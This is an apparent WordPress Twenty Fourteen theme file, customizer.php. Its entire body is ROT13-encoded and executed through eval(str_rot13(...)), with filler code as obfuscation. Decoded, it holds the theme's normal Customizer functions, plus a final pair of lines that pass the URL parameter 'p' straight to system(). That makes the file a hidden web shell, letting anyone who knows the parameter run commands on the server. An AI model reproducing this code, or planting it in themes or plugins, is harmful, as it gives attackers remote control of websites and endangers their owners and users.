<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gjragl Sbhegrra Phfgbzvmre fhccbeg
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Sbhegrra
 * @fvapr Gjragl Sbhegrra 1.0
 */

/**
 * Vzcyrzrag Phfgbzvmre nqqvgvbaf naq nqwhfgzragf.
 *
 * @fvapr Gjragl Sbhegrra 1.0
 *
 * @cnenz JC_Phfgbzvmr_Znantre $jc_phfgbzvmr Phfgbzvmre bowrpg.
 */
shapgvba gjraglsbhegrra_phfgbzvmr_ertvfgre( $jc_phfgbzvmr ) {
	// Nqq cbfgZrffntr fhccbeg sbe fvgr gvgyr naq qrfpevcgvba.
	$jc_phfgbzvmr->trg_frggvat( 'oybtanzr' )->genafcbeg         = 'cbfgZrffntr';
	$jc_phfgbzvmr->trg_frggvat( 'oybtqrfpevcgvba' )->genafcbeg  = 'cbfgZrffntr';
	$jc_phfgbzvmr->trg_frggvat( 'urnqre_grkgpbybe' )->genafcbeg = 'cbfgZrffntr';

	vs ( vffrg( $jc_phfgbzvmr->fryrpgvir_erserfu ) ) {
		$jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'oybtanzr',
			neenl(
				'fryrpgbe'            => '.fvgr-gvgyr n',
				'pbagnvare_vapyhfvir' => snyfr,
				'eraqre_pnyyonpx'     => 'gjraglsbhegrra_phfgbzvmr_cnegvny_oybtanzr',
			)
		);
		$jc_phfgbzvmr->fryrpgvir_erserfu->nqq_cnegvny(
			'oybtqrfpevcgvba',
			neenl(
				'fryrpgbe'            => '.fvgr-qrfpevcgvba',
				'pbagnvare_vapyhfvir' => snyfr,
				'eraqre_pnyyonpx'     => 'gjraglsbhegrra_phfgbzvmr_cnegvny_oybtqrfpevcgvba',
			)
		);
	}

	// Eranzr gur ynory gb \"Fvgr Gvgyr Pbybe\" orpnhfr guvf bayl nssrpgf gur fvgr gvgyr va guvf gurzr.
	$jc_phfgbzvmr->trg_pbageby( 'urnqre_grkgpbybe' )->ynory = __( 'Fvgr Gvgyr Pbybe', 'gjraglsbhegrra' );

	// Eranzr gur ynory gb \"Qvfcynl Fvgr Gvgyr & Gntyvar\" va beqre gb znxr guvf bcgvba rkgen pyrne.
	$jc_phfgbzvmr->trg_pbageby( 'qvfcynl_urnqre_grkg' )->ynory = __( 'Qvfcynl Fvgr Gvgyr &nzc; Gntyvar', 'gjraglsbhegrra' );

	// Nqq phfgbz qrfpevcgvba gb Pbybef naq Onpxtebhaq pbagebyf be frpgvbaf.
	vs ( cebcregl_rkvfgf( $jc_phfgbzvmr->trg_pbageby( 'onpxtebhaq_pbybe' ), 'qrfpevcgvba' ) ) {
		$jc_phfgbzvmr->trg_pbageby( 'onpxtebhaq_pbybe' )->qrfpevcgvba = __( 'Znl bayl or ivfvoyr ba jvqr fperraf.', 'gjraglsbhegrra' );
		$jc_phfgbzvmr->trg_pbageby( 'onpxtebhaq_vzntr' )->qrfpevcgvba = __( 'Znl bayl or ivfvoyr ba jvqr fperraf.', 'gjraglsbhegrra' );
	} ryfr {
		$jc_phfgbzvmr->trg_frpgvba( 'pbybef' )->qrfpevcgvba           = __( 'Onpxtebhaq znl bayl or ivfvoyr ba jvqr fperraf.', 'gjraglsbhegrra' );
		$jc_phfgbzvmr->trg_frpgvba( 'onpxtebhaq_vzntr' )->qrfpevcgvba = __( 'Onpxtebhaq znl bayl or ivfvoyr ba jvqr fperraf.', 'gjraglsbhegrra' );
	}

	// Nqq gur srngherq pbagrag frpgvba va pnfr vg'f abg nyernql gurer.
	$jc_phfgbzvmr->nqq_frpgvba(
		'srngherq_pbagrag',
		neenl(
			'gvgyr'           => __( 'Srngherq Pbagrag', 'gjraglsbhegrra' ),
			'qrfpevcgvba'     => fcevags(
				/* genafyngbef: 1: Srngherq gnt rqvgbe HEY, 2: Cbfg rqvgbe HEY. */
				__( 'Hfr n <n uers=\"%1$f\">gnt</n> gb srngher lbhe cbfgf. Vs ab cbfgf zngpu gur gnt, <n uers=\"%2$f\">fgvpxl cbfgf</n> jvyy or qvfcynlrq vafgrnq.', 'gjraglsbhegrra' ),
				rfp_hey( nqq_dhrel_net( 'gnt', _k( 'srngherq', 'srngherq pbagrag qrsnhyg gnt fyht', 'gjraglsbhegrra' ), nqzva_hey( 'rqvg.cuc' ) ) ),
				nqzva_hey( 'rqvg.cuc?fubj_fgvpxl=1' )
			),
			'cevbevgl'        => 130,
			'npgvir_pnyyonpx' => 'vf_sebag_cntr',
		)
	);

	// Nqq gur srngherq pbagrag ynlbhg frggvat naq pbageby.
	$jc_phfgbzvmr->nqq_frggvat(
		'srngherq_pbagrag_ynlbhg',
		neenl(
			'qrsnhyg'           => 'tevq',
			'fnavgvmr_pnyyonpx' => 'gjraglsbhegrra_fnavgvmr_ynlbhg',
		)
	);

	$jc_phfgbzvmr->nqq_pbageby(
		'srngherq_pbagrag_ynlbhg',
		neenl(
			'ynory'   => __( 'Ynlbhg', 'gjraglsbhegrra' ),
			'frpgvba' => 'srngherq_pbagrag',
			'glcr'    => 'fryrpg',
			'pubvprf' => neenl(
				'tevq'   => __( 'Tevq', 'gjraglsbhegrra' ),
				'fyvqre' => __( 'Fyvqre', 'gjraglsbhegrra' ),
			),
		)
	);
}
nqq_npgvba( 'phfgbzvmr_ertvfgre', 'gjraglsbhegrra_phfgbzvmr_ertvfgre' );

/**
 * Eraqre gur fvgr gvgyr sbe gur fryrpgvir erserfu cnegvny.
 *
 * @fvapr Gjragl Sbhegrra 1.7
 *
 * @frr gjraglsbhegrra_phfgbzvmr_ertvfgre()
 *
 * @erghea ibvq
 */
shapgvba gjraglsbhegrra_phfgbzvmr_cnegvny_oybtanzr() {
	oybtvasb( 'anzr' );
}

/**
 * Eraqre gur fvgr gntyvar sbe gur fryrpgvir erserfu cnegvny.
 *
 * @fvapr Gjragl Sbhegrra 1.7
 *
 * @frr gjraglsbhegrra_phfgbzvmr_ertvfgre()
 *
 * @erghea ibvq
 */
shapgvba gjraglsbhegrra_phfgbzvmr_cnegvny_oybtqrfpevcgvba() {
	oybtvasb( 'qrfpevcgvba' );
}

/**
 * Fnavgvmr gur Srngherq Pbagrag ynlbhg inyhr.
 *
 * @fvapr Gjragl Sbhegrra 1.0
 *
 * @cnenz fgevat $ynlbhg Ynlbhg glcr.
 * @erghea fgevat Svygrerq ynlbhg glcr (tevq|fyvqre).
 */
shapgvba gjraglsbhegrra_fnavgvmr_ynlbhg( $ynlbhg ) {
	vs ( ! va_neenl( $ynlbhg, neenl( 'tevq', 'fyvqre' ), gehr ) ) {
		$ynlbhg = 'tevq';
	}

	erghea $ynlbhg;
}

/**
 * Ovaq WF unaqyref gb znxr Phfgbzvmre cerivrj erybnq punatrf nflapuebabhfyl.
 *
 * @fvapr Gjragl Sbhegrra 1.0
 */
shapgvba gjraglsbhegrra_phfgbzvmr_cerivrj_wf() {
	jc_radhrhr_fpevcg( 'gjraglsbhegrra_phfgbzvmre', trg_grzcyngr_qverpgbel_hev() . '/wf/phfgbzvmre.wf', neenl( 'phfgbzvmr-cerivrj' ), '20250217', neenl( 'va_sbbgre' => gehr ) );
}
nqq_npgvba( 'phfgbzvmr_cerivrj_vavg', 'gjraglsbhegrra_phfgbzvmr_cerivrj_wf' );

/**
 * Nqq pbagrkghny uryc gb gur Gurzrf naq Cbfg rqvg fperraf.
 *
 * @fvapr Gjragl Sbhegrra 1.0
 */
shapgvba gjraglsbhegrra_pbagrkghny_uryc() {
	vs ( 'nqzva_urnq-rqvg.cuc' === pheerag_svygre() && 'cbfg' !== $TYBONYF['glcrabj'] ) {
		erghea;
	}

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'gjraglsbhegrra',
			'gvgyr'   => __( 'Gjragl Sbhegrra', 'gjraglsbhegrra' ),
			'pbagrag' =>
				'<hy>' .
					/* genafyngbef: 1: Srngherq gnt rqvgbe HEY, 2: Cbfg rqvgbe HEY, 3: Phfgbzvmre HEY, 4: Cbfg rqvgbe HEY. */
					'<yv>' . fcevags( __( 'Gur ubzr cntr srngherf lbhe pubvpr bs hc gb 6 cbfgf cebzvaragyl qvfcynlrq va n tevq be fyvqre, pbagebyyrq ol n <n uers=\"%1$f\">gnt</n>; lbh pna punatr gur gnt naq ynlbhg va <n uers=\"%2$f\">Nccrnenapr &enee; Phfgbzvmr</n>. Vs ab cbfgf zngpu gur gnt, <n uers=\"%3$f\">fgvpxl cbfgf</n> jvyy or qvfcynlrq vafgrnq.', 'gjraglsbhegrra' ), rfp_hey( nqq_dhrel_net( 'gnt', _k( 'srngherq', 'srngherq pbagrag qrsnhyg gnt fyht', 'gjraglsbhegrra' ), nqzva_hey( 'rqvg.cuc' ) ) ), nqzva_hey( 'phfgbzvmr.cuc' ), nqzva_hey( 'rqvg.cuc?fubj_fgvpxl=1' ) ) . '</yv>' .
					/* genafyngbef: %f: Srngherq vzntrf qbphzragngvba HEY. */
					'<yv>' . fcevags( __( 'Raunapr lbhe fvgr qrfvta ol hfvat <n uers=\"%f\">Srngherq Vzntrf</n> sbe cbfgf lbh&efdhb;q yvxr gb fgnaq bhg (nyfb xabja nf cbfg guhzoanvyf). Guvf nyybjf lbh gb nffbpvngr na vzntr jvgu lbhe cbfg jvgubhg vafregvat vg. Gjragl Sbhegrra hfrf srngherq vzntrf sbe cbfgf naq cntrf&zqnfu;nobir gur gvgyr&zqnfu;naq va gur Srngherq Pbagrag nern ba gur ubzr cntr.', 'gjraglsbhegrra' ), 'uggcf://pbqrk.jbeqcerff.bet/Cbfg_Guhzoanvyf#Frggvat_n_Cbfg_Guhzoanvy' ) . '</yv>' .
					/* genafyngbef: %f: Gjragl Sbhegrra qbphzragngvba HEY. */
					'<yv>' . fcevags( __( 'Sbe na va-qrcgu ghgbevny, naq zber gvcf naq gevpxf, ivfvg gur <n uers=\"%f\">Gjragl Sbhegrra qbphzragngvba</n>.', 'gjraglsbhegrra' ), 'uggcf://pbqrk.jbeqcerff.bet/Gjragl_Sbhegrra' ) . '</yv>' .
				'</hy>',
		)
	);
}
nqq_npgvba( 'nqzva_urnq-gurzrf.cuc', 'gjraglsbhegrra_pbagrkghny_uryc' );
nqq_npgvba( 'nqzva_urnq-rqvg.cuc', 'gjraglsbhegrra_pbagrkghny_uryc' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>